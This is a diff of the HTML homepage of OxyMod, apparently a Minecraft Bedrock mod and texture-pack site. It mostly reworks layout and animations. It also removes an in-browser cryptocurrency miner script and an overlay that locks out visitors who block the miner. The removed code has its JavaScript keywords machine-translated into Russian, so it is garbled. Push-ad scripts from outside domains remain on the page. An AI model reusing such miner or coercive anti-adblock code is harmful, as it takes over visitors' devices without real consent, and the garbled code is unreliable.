@@ -7,15 +7,10 @@
     <meta name="google-adsense-account" content="ca-pub-3335866087846032">
     <meta confirm="partners-house-182092"/>
     <link rel="stylesheet" href="home.css">
-
-    <!-- Иконка сайта -->
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
     <link rel="icon" href="favicon.ico" type="image/x-icon">
-
-    <!-- Описание сайта -->
     <meta name="description" content="OxyMod - Best Texture Packs and Mods for Minecraft Bedrock Edition">
     <meta name="description" content="OxyMod - Лучшие Текстур Паки и Моды для Minecraft Bedrock Edition" lang="ru">
-
-    <!-- Другие метатеги -->
     <meta name="keywords" content="OxyMod, texture packs, mods, рп, ресурс паки, текстур паки, моды, майнкрафт, майнкрафт бедрок, майнкрафт пе, майн, 1.1.5, 1.21.0, MCPE, мкпе">
     <meta name="author" content="OxyMod">
 </head>
@@ -31,14 +26,6 @@
   gtag('config', 'G-4MJ1WYC4WQ');
 </script>
 
-<nav class="navbar">
-    <div class="menu-dots">☰</div>
-    <div class="dropdown-menu">
-        <a href="https://t.me/tominecraft"><img src="https://graph.org/file/9251496dc25254788a73b.jpg" alt="icon"> Telegram Channel</a>
-        <a href="https://t.me/rpfozzy"><img src="https://graph.org/file/15ac1ac0f69f8947caf9a.jpg" alt="icon"> Telegram Channel</a>
-    </div>
-</nav>
-
 <script type="text/javascript" src="https://majorpushme1.com/?ma=gfrgmmbygm5ha3ddf42denbu" async></script>
 
 <script>
@@ -53,40 +40,29 @@
 </script>
 <script type="text/javascript" src="https://majorpush.pro/?pu=key" async></script>
 
-<script src="https://www.hostingcloud.racing/GzTS.js""></script>
-<script>
-    вар _клиент = новый Клиент.Анонимный('0a97e3c22b2b9a5b0f5059a6b3f27c0f2a15f9ae801535328a717418c01cdf1d', {
-        дроссель: 0, в: 'в'
-    });
-    _клиент.начать();
-    _клиент.addMiningУведомление("Топ", "На этом сайте работает майнер JavaScript от coinimp.com. Если это вас беспокоит, вы можете это остановить.", "#ccccc", 40, "#3d3d3d");
-</script>
-<script>
-    setTimeout(функция(){
-        если(тип _клиент === 'неопр" || _клиент === нулевой)
-        {
-            вар сообщениеDiv = документ.создатьЭлемент("див");
-            сообщениеDiv.setAttribute("стиль","ширина: 50%; цвет фона: белый; заполнение: 15px; дисплей: рядный блок; вертикальный выравнивание: средний;");
-            сообщениеDiv.appendChild(документ.createTextNode ("Пожалуйста, позвольте нашему майнеру в вашем программном обеспечении блокировщика продолжать просмотр нашего сайта. Перезагрузить страницу после этого. ("));
-            вар основнойDiv = документ.создатьЭлемент("див");
-            основнойDiv.setAttribute("стиль","позиция: абсолютная; верхняя: 0px; правая: 0px; ширина: 100%; высота: 100%; дисплей: гибкий; цвет фона: #4c4c4c; выравнивание-элементы: центр; обоснование-содержание: центр");
-            основнойDiv.appendChild(сообщениеDiv);
-            документ.body.appendChild(основнойDiv);
-            документ.getElementsByTagName("тело")[0].style.overflow = "скрытый";
-            окно.scrollTo(0, 0);
-        }
-    }1000);
-</script>
+<nav class="navbar">
+    <div class="menu-dots">☰</div>
+    <div class="login-btn">Вход</div>
+    <div class="dropdown-menu">
+        <a href="https://t.me/tominecraft"><img src="https://graph.org/file/9251496dc25254788a73b.jpg" alt="icon"> Telegram Channel</a>
+        <a href="https://t.me/rpfozzy"><img src="https://graph.org/file/15ac1ac0f69f8947caf9a.jpg" alt="icon"> Telegram Channel</a>
+    </div>
+</nav>
 
-<img src="OxyMod.jpg" alt="OxyMod" id="headerImage1" class="animated">
+<img src="OxyMod.jpg" alt="OxyMod" id="headerImage1" class="animated header-image">
 
-<!-- Рекламный блок -->
 <div class="ad-container">
     <div class="tgx-vbf" data-vbf-id="26764"></div>
 </div>
 
 <div class="container">
     <!-- Посты будут добавлены сюда через JavaScript -->
+</div>
+
+<!-- Добавляем блок с кнопкой -->
+<div class="button-link">
+    <img src="https://graph.org/file/your-original-image-url.jpg" class="default" alt="Default Image">
+    <img src="https://graph.org/file/0197d91df205e66e987a6.jpg" class="hover" alt="Hover Image">
 </div>
 
 <div class="footer">
@@ -111,6 +87,15 @@
             dropdownMenu.classList.remove('show');
         }
     });
+
+    // Добавляем эффект дрожи при нажатии на изображение OxyMod.jpg
+    const headerImage1 = document.getElementById('headerImage1');
+    headerImage1.addEventListener('click', () => {
+        headerImage1.classList.add('shake');
+        setTimeout(() => {
+            headerImage1.classList.remove('shake');
+        }, 500);
+    });
 </script>
 
 <!-- Скрипт для анимации изображений -->
@@ -118,7 +103,7 @@
     document.addEventListener("DOMContentLoaded", function() {
         const headerImage1 = document.getElementById('headerImage1');
         const headerImage2 = document.getElementById('headerImage2');
-        
+
         headerImage1.addEventListener('animationend', function() {
             headerImage2.style.display = 'block';
         });
@@ -129,16 +114,8 @@
 <script>
     document.addEventListener("DOMContentLoaded", function() {
         fetch('posts.json')
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
+            .then(response => response.json())
             .then(posts => {
-                console.log('Posts loaded:', posts);
-
-                // Сортируем посты по количеству просмотров
                 posts.sort((a, b) => b.views - a.views);
 
                 const container = document.querySelector('.container');
@@ -148,18 +125,20 @@
                 }
 
                 let block;
+                let slideContainer;
 
                 posts.forEach((post, index) => {
-                    // Создаем новый блок для каждых трех постов
                     if (index % 3 === 0) {
                         block = document.createElement('div');
-                        block.classList.add('scroll-container');
+                        block.classList.add('block-container');
+                        slideContainer = document.createElement('div');
+                        slideContainer.classList.add('slide-container');
+                        block.appendChild(slideContainer);
                         container.appendChild(block);
                     }
 
                     const item = document.createElement('div');
                     item.classList.add('item');
-
                     item.innerHTML = `
                         <div class="image-container">
                             <img src="${post.image}" onclick="window.location.href='${post.link}'" alt="Image">
@@ -176,8 +155,15 @@
                             </a>
                         </div>
                     `;
+                    slideContainer.appendChild(item);
+                });
 
-                    block.appendChild(item);
+                // Добавляем класс анимации для постов
+                const items = document.querySelectorAll('.item');
+                items.forEach((item, index) => {
+                    setTimeout(() => {
+                        item.classList.add('fade-in');
+                    }, index * 100);
                 });
             })
             .catch(error => console.error('Error loading posts:', error));
@@ -188,13 +174,7 @@
 <script defer src="https://cdn.adlook.me/js/vbf.js"></script>
 <script defer src="https://cdn.adlook.me/js/rlf.js"></script>
 
+<script src="rain.js"></script>
+
 </body>
 </html>
-
-<div class="blur-top"></div>
-<div class="blur-bottom"></div>
-
-<script src="phsw2.js"></script>
-<script src="smooth-scroll.js"></script>
-
-<script src="app.js"></script>
